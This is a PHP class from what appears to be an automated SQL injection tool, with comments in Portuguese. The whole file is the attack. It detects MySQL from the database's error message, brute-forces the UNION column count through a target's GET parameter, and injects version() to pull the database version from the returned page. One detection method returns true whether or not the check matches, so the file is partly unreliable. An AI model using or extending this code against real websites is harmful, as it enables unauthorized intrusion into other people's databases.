<?php

/**
 * Classe que faz consultas específicas em bases de dado SQL.
 * 
 * @final
 * @author José Roniérison <ronierison.silva@gmail.com>
 * @date 14.07.2013
 */

final class MySQLInjection extends Olimpo_Zeus
{
    /**
     * Código de identificação do arquivo de modelo. 
     * @todo Identificador, código único.
     */
    const codeFile = 4;
    
    /**
     * @var String String presente no erro MySQL primário. O erro da aspa.
     */
    private static $_MySQLKeys = 'You have an error in your SQL syntax; check the manual that corresponds to your MySQL';
    
    
    
    /**
     * O construtor recebe a classe do procurador já com as informações para 
     * localizar a inserção SQL. Nesta etapa ele verifica se o ataque é possível
     * com técnicas do MySQL.
     * 
     * @param Procurador $Procurador Procurador de informações de SQL Injection
     */
    public function __construct(Procurador $Procurador) 
    {
        $this->Procurador = $Procurador;
    }
    
    /**
     * Descobre se o banco de dados é MySQL fazendo buscas de erros específicos
     * nos dados recolhidos pelo procurador.
     * 
     * @return bollean Verdadeiro se o banco for MySQL e false caso contrário.
     */
    public function DBisMySQL()
    {
        $SQLInjetionTagLines = $this->Procurador->getHTMLTagLines();
        
        foreach($SQLInjetionTagLines as $line){
            if(strpos($line, self::$_MySQLKeys)!== false){
                return true;
            }
        }
        
        return true;
    }
    
    /**
     * Conta o número de colunas para fazer inserção.
     */
    public function countColumns()
    {
        $this->_lastcommand = '';
        $getVarWSI = null;
        $getVarWSI[0][0] = $this->Procurador->getTargetGetVar();
        
        $columnsasArray = null;
        for($count = 1; $count <= 25; $count++){
            $columnsasArray[$count] = $count;
            $columnsQuery = $this->doColumnsQuery($columnsasArray);
            
            $getVarWSI[0][1] = str_replace('%get_value%', self::newGetValue, 
                                str_replace('%union_columns%', $columnsQuery, self::unionStatmentStructure));            
            
            $this->Procurador->discoverInjectionInfo($getVarWSI);
            
            $markers[$count] = str_replace('%column%', $count, self::markerOutput);
            $this->_lastcommand = $this->Procurador->getCommand();
            
            if($this->checkCountColumns($this->Procurador->getDataHTMLSQLInjection(), $markers)){
                $this->_numberofunioncolumns = $count;
                break;
            }
        }
        
        
    }
    
    /**
     * Verifica dados da contagem de coluna retornando true, caso seja o número 
     * inserido o correto;
     * 
     * @param Array $htmllines Array com linhas html para ser processado
     */
    private function checkCountColumns($htmlLines, $searchParam)
    {
        foreach($htmlLines as $line){
            trim(str_replace('', '', $line));
            
            $broke = NULL;
            foreach($searchParam as $column => $param){
                $broke = explode($param, $line);
                
                if(count($broke) === 3){
                    $this->_outputcolumn = $column;
                    return true;
                }
            }
        }
        return false;
    }
    
    /**
     * Busca versão do banco de dados utilizando a função version() presente no
     * MySQL. Também determina a coluna que será utilizada como OutPut dos dados.
     * 
     * @param Target_Database $database Base de dados do alvo
     * @return Target_Database
     */
    public function getVersion(Target_Database $database)
    {
        if(empty($this->_numberofunioncolumns) || empty($this->_outputcolumn)){
            throw new Exception('Não é possível descobrir a versão do banco de dados sem o número de colunas ou um output para estrutura UNION', self::codeFile.'00005');
            return false;
        }
        
        $this->_lastcommand = null;
        
        $getVarWSI = null;
        $getVarWSI[0][0] = $this->Procurador->getTargetGetVar();
        
        for($count = 1; $count <= $this->_numberofunioncolumns; $count++){
            if($count === $this->_outputcolumn){
                $columns[$count] = 'version()';
            }else{
                $columns[$count] = $count;
            }
        }
        
        $columnsQuery = $this->doColumnsQuery($columns, $this->_outputcolumn);
        //Zend_Debug::dump($columnsQuery);
        $getVarWSI[0][1] = str_replace('%get_value%', self::newGetValue, str_replace('%union_columns%', $columnsQuery, self::unionStatmentStructure));
            
        $this->Procurador->discoverInjectionInfo($getVarWSI);
        $this->_lastcommand = $this->Procurador->getCommand();
        
        $htmltaglines = $this->Procurador->getDataHTMLSQLInjection();
        
        if(count($htmltaglines) > 0){
            foreach($htmltaglines as $line){
                for($column = 1; $column <= $this->_numberofunioncolumns; $column++){
                    $marker = str_replace( "%column%", $column, self::markerOutput);
                    $broke = explode($marker, $line);
                    
                    if(count($broke) === 3){
                        $version = str_replace('%', '', trim($broke[1]) );
                        
                        $database->setVersion($version);
                        return;
                    }
                }
            }
        }
    }
    
}
?>
